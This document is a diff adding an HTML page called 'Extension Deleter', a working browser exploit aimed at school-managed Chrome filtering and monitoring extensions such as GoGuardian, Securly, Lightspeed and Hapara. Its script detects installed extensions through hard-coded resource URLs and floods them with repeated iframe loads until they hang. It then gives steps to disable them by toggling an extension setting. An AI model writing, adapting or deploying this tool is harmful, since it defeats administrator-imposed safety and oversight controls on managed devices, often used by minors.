@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Varela+Round&display=swap">
+  <style>
+    body {
+      font-family: 'Varela Round', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f8f9fa;
+      color: #333;
+    }
+    header {
+      background-color: #343a40;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+    }
+    .logo {
+      width: 50px;
+      height: 50px;
+      margin-right: 10px;
+    }
+    .container {
+      max-width: 800px;
+      margin: 150px auto 0 auto;
+      padding: 20px;
+      text-align: center;
+      background: #fff;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 8px;
+    }
+    select {
+      font-family: 'Varela Round', sans-serif;
+      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 16px;
+      border: 1px solid #ced4da;
+      border-radius: 4px;
+      width: 100%;
+    }
+    button {
+      font-family: 'Varela Round', sans-serif;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      color: #fff;
+      font-size: 24px;
+      user-select: none;
+      flex-direction: column;
+    }
+    .spinner {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #killExtensionText {
+      display: none;
+      margin-top: 20px;
+      color: #333;
+      font-size: 18px;
+      text-align: center;
+      background: #e9ecef;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+   	 #killButton {
+	  display: none;
+	  background-color: #dc3545;
+	  color: #fff;
+	  border: none;
+	  padding: 10px 20px;
+	  font-size: 16px;
+	  cursor: pointer;
+	  border-radius: 5px;
+ 	  transition: background-color 0.3s ease;
+	}
+
+	#killButton:hover {
+	  background-color: #9c1c28;
+	}
+    footer {
+      background-color: #343a40;
+      color: #fff;
+      text-align: center;
+      padding: 10px;
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+    }
+    footer a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>Extension Deleter</h1>
+</header>
+
+<div class="container">
+  <label for="iframeSelect" id="labelForIframeSelect">Select extension:</label>
+  <select id="iframeSelect">
+  </select>
+  <button onclick="warning();" id="hangButton">Hang Extension!</button>
+  <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="spinner"></div>
+  Hanging... (This will take about 1 minute)
+</div>
+<div id="killExtensionText"></div>
+
+
+<script>
+  async function checkExtensionURL(url) {
+    try {
+      const response = await fetch(url);
+      if (response.ok) {
+        return true;
+      } else {
+        return false;
+      }
+    } catch (error) {
+      return false;
+    }
+  }
+
+  async function populateSelectOptions() {
+    const selectElement = document.getElementById("iframeSelect");
+    const extensions = {
+      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
+      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
+      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
+      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
+      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
+      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
+      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
+      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
+      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
+      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
+      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
+      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
+      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
+      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
+      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
+      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
+      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
+      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
+      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
+      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
+      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
+      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
+      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
+      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
+      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
+      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
+    };
+    
+    let hasSupportedExtensions = false;
+
+    for (const [name, url] of Object.entries(extensions)) {
+      if (await checkExtensionURL(url)) {
+        const option = document.createElement("option");
+        option.value = url;
+        option.textContent = name;
+        selectElement.appendChild(option);
+        hasSupportedExtensions = true;
+      }
+    }
+    
+    if (!hasSupportedExtensions) {
+      const option = document.createElement("option");
+      option.value = "";
+      option.textContent = "No supported extensions installed";
+      selectElement.appendChild(option);
+      document.getElementById("hangButton").style.display = "none";
+    }
+  }
+
+  populateSelectOptions();
+  
+  function replaceIframes(container, iframeSrc) {
+    for (let i = 0; i < 1000; i++) {
+      var iframe = document.createElement('iframe');
+      iframe.src = iframeSrc;
+      iframe.style.width = '100%';
+      iframe.style.height = '100px';
+      container.appendChild(iframe);
+    }
+    setTimeout(function() {
+      while (container.firstChild) {
+        container.removeChild(container.firstChild);
+      }
+      replaceIframes(container, iframeSrc);
+    }, 5);
+  }
+
+  function warning() {
+    var overlay = document.getElementById("overlay");
+    overlay.style.display = "flex";
+    let iframeSelect = document.getElementById("iframeSelect");
+    let selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
+    let selectedSrc = iframeSelect.value;
+    let popup = window.open("", "PopupWindow", "width=100,height=100");
+    let popupDocument = popup.document;
+    let popupBody = popupDocument.body;
+    let iframeContainer = popupDocument.createElement('div');
+    iframeContainer.id = 'iframeContainer';
+    popupBody.appendChild(iframeContainer);
+    replaceIframes(iframeContainer, selectedSrc);
+    setTimeout(function() {
+      popup.close();
+      let extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+      let extensionURL = "chrome-extension://" + extensionId;
+      let killExtensionText = document.getElementById("killExtensionText");
+      killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
+      setTimeout(function() {
+        overlay.style.display = "none";
+        killExtensionText.style.display = "block";
+        document.getElementById("killButton").style.display = "inline-block";
+        document.getElementById("hangButton").style.display = "none";
+	document.getElementById("iframeSelect").style.display = "none";
+	document.getElementById("labelForIframeSelect").style.display = "none";
+        document.getElementById("killButton").setAttribute("data-url", selectedSrc);
+      }, 1);
+    }, 1);
+  }
+
+  function openExtensionPopup() {
+    var selectedSrc = document.getElementById("killButton").getAttribute("data-url");
+    var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
+    var killExtensionText = document.getElementById("killExtensionText");
+    document.getElementById("killButton").style.display = "none";
+    killExtensionText.innerHTML = "Make sure to keep this tab open. Then in a new tab open <strong>chrome://extensions/?id=" + extensionId + "</strong> Flip the switch called allow access to file URLs twice. The extension was successfully killed! Now you can close that tab as well as this one. If you want to restore the extension, flip the allow access to file URLs switch again.";
+    window.location.href = selectedSrc;
+  }
+</script>
+</body>
+</html>
+
+<script defer data-domain="html.cafe" src="https://milkymouse.com/js/script.js"></script>
+
+   
